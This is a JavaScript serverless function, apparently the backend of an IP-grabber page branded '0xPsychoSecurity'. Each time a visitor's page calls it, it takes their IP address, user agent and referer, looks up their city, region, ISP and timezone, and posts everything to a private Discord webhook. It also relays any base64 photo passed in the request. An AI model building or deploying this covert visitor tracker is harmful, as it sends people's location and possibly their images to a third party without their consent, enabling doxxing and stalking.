export async function handler(event) {
  // Get Discord webhook URL from Netlify environment variable
  const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
  
  if (!DISCORD_WEBHOOK_URL || !DISCORD_WEBHOOK_URL.startsWith('https://discord.com/api/webhooks/')) {
    return { statusCode: 500, body: 'Discord webhook URL not configured' };
  }

  // Get client IP address
  const clientIP = event.headers['x-forwarded-for'] || 
                   event.headers['x-real-ip'] || 
                   event.headers['x-client-ip'] || 
                   event.headers['cf-connecting-ip'] || 
                   'Unknown';

  // Parse request body for additional data
  let requestData = {};
  try {
    if (event.body) {
      requestData = JSON.parse(event.body);
    }
  } catch (error) {
    console.error('Error parsing request body:', error);
  }

  // Get additional request information
  const userAgent = event.headers['user-agent'] || 'Unknown';
  const referer = event.headers['referer'] || 'Direct';
  const timestamp = new Date().toISOString();

  // Get IP geolocation data
  let geoData = {
    country: 'Unknown',
    city: 'Unknown',
    region: 'Unknown',
    org: 'Unknown',
    timezone: 'Unknown'
  };

  try {
    // Try to get geolocation from IPAPI
    const geoResponse = await fetch(`https://ipapi.co/${clientIP}/json/`);
    if (geoResponse.ok) {
      const geo = await geoResponse.json();
      geoData = {
        country: geo.country_name || 'Unknown',
        city: geo.city || 'Unknown',
        region: geo.region || 'Unknown',
        org: geo.org || geo.asn_org || 'Unknown',
        timezone: geo.timezone || 'Unknown'
      };
    }
  } catch (error) {
    console.error('Error fetching geolocation:', error);
  }

  // Generate country flag emoji
  const getFlagEmoji = (countryCode) => {
    if (!countryCode || countryCode.length !== 2) return '🌍';
    const codePoints = [...countryCode.toUpperCase()].map(char => 
      0x1F1E6 + (char.charCodeAt(0) - 65)
    );
    return String.fromCodePoint(...codePoints);
  };

  const flagEmoji = getFlagEmoji(geoData.country);

  // Create Discord embed
  const embed = {
    title: '🔍 New Visitor Detected',
    description: `${flagEmoji} New visitor from ${geoData.country}`,
    color: 0x00CED1, // Discord blue color
    fields: [
      {
        name: '🌐 IP Address',
        value: clientIP,
        inline: true
      },
      {
        name: '📍 Location',
        value: `${geoData.city}, ${geoData.region}`,
        inline: true
      },
      {
        name: '🏢 Organization',
        value: geoData.org,
        inline: false
      },
      {
        name: '🌍 Country',
        value: `${flagEmoji} ${geoData.country}`,
        inline: true
      },
      {
        name: '🕐 Timezone',
        value: geoData.timezone,
        inline: true
      },
      {
        name: '🔗 Referer',
        value: referer,
        inline: false
      },
      {
        name: '🖥️ User Agent',
        value: userAgent.length > 100 ? userAgent.substring(0, 100) + '...' : userAgent,
        inline: false
      }
    ],
    footer: {
      text: 'Visitor Analytics • 0xPsychoSecurity',
      icon_url: 'https://i.imgur.com/7YLDqNV.png' // Custom icon URL
    },
    timestamp: timestamp
  };

  // Add thumbnail if requested
  if (requestData.includeImage && requestData.photo) {
    try {
      // Validate base64 image
      if (typeof requestData.photo === 'string' && requestData.photo.startsWith('data:image/')) {
        embed.thumbnail = {
          url: requestData.photo
        };
      }
    } catch (error) {
      console.error('Error processing image:', error);
    }
  }

  // Create Discord webhook payload
  const webhookPayload = {
    embeds: [embed]
  };

  // Send to Discord webhook
  try {
    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(webhookPayload)
    });

    if (!response.ok) {
      console.error('Discord webhook error:', response.status, response.statusText);
      return { 
        statusCode: response.status, 
        body: `Discord webhook error: ${response.statusText}` 
      };
    }

    return { statusCode: 204, body: 'Success' };
  } catch (error) {
    console.error('Error sending to Discord webhook:', error);
    return { statusCode: 500, body: 'Internal server error' };
  }
}